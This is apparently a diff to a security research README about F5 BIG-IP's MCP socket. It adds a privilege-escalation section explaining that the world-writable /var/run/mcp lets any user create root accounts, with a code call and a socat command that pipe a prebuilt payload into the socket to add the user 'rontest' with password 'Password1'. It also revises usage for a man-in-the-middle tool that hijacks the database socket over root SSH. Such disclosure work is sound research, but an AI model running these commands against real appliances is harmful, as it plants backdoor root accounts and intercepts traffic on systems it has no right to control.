@@ -68,34 +68,58 @@ result (structure [96 bytes]):
  result_message (string [78 bytes]) = "01020066:3: The requested user (rontest) already exists in partition Common."
 ```
 
+## Privesc
+
+As of this writing, `/var/run/mcp` is world-writable and therefore any user can
+write to it! That means any user can add root users, which is a great thing to
+do after exploiting a service and getting a non-root shell.
+
+You can edit `mcp-builder.rb` to create whatever account you want, using
+sha512crypt-style password hashes:
+
+```
+  create_root_account_plz("username", '$6$hashedpassword')
+```
+
+Then send the output from that into `/var/run/mcp` and it should create you an
+account.
+
+If you just run the PoC (or use `escalationplz.bin`), you'll get a new user with
+the username `rontest` and the password `Password1`:
+
+```
+socat -t100 - UNIX-CONNECT:/var/run/mcp < escalationplz.bin
+```
+
 # Man in the Middle Inspection
 
 I also wrote a tool to inspect database queries - [mcp-mitm.rb](/mcp-mitm.rb).
-To run it, edit the script to set up the variables:
+This isn't an exploit, it's just an analysis tool.
 
-```
-ME = "10.0.0.146"
-TARGET = "10.0.0.136"
-PORT1 = 1234
-PORT2 = 1235
-DO_SETUP = true
-```
+To run it:
 
-If `DO_SETUP` is `true`, make sure you can `ssh root@<TARGET>` without a
-password. Otherwise, it'll tell you which commands to run.
+* Ensure the server isn't being used for anything important - this is somewhere between "destructive" and "interrupty" because we yoink the database socket (it does try to fix it after!)
+* Ensure the F5 Big-IP host can connect back to you on any two ports (1234 and 1235 by default)
+* Ensure you can `ssh root@<target>` with no password or other input (or edit the code and turn off `DO_SETUP`)
 
-Note that this tries to clean up, but can potentially destabilize the server
-(because we're moving a named pipe). Don't run against prod. And if you do
-break the server, rebooting will fix it.
+Pretty much any potential "damage" is fixed with a reboot, since it creates the
+socket at boot, but you probably don't wanna do that on prod.
 
-Once it's configured, just run it:
+Anyway, execute with no args to get the usage, then fill in the important IP
+addresses:
 
 ```
 $ ruby ./mcp-mitm.rb
+Usage: ruby ./mcp-mitm.rb <your ip> <target ip> [listen port 1] [listen port 2]
+[...]
+
+$ ruby ./mcp-mitm.rb 10.0.0.179 10.0.0.162
+
+$ ruby ./mcp-mitm.rb 10.0.0.179 10.0.0.162
 Configuration (edit the script to change, this is a PoC!):
 
-Your IP: 10.0.0.146
-Target IP: 10.0.0.136
+Your IP: 10.0.0.179
+Target IP: 10.0.0.162
 Listening port 1: 1234
 Listening port 2: 1235
 SSH into the target to set things up: true
@@ -103,10 +127,11 @@ SSH into the target to set things up: true
   (Yes yes, I know it's a PoC!)
 SSH'ing into the server to set things up
 Ready!
+```
 
+If you wait around (or do stuff on the server), you'll see sessions:
 
----------------------------------------------------
-
+```
 Received session @ #<TCPSocket:0x000000000170d630> <--> #<TCPSocket:0x000000000170d658>
 
 user_authenticated (structure [15 bytes]):
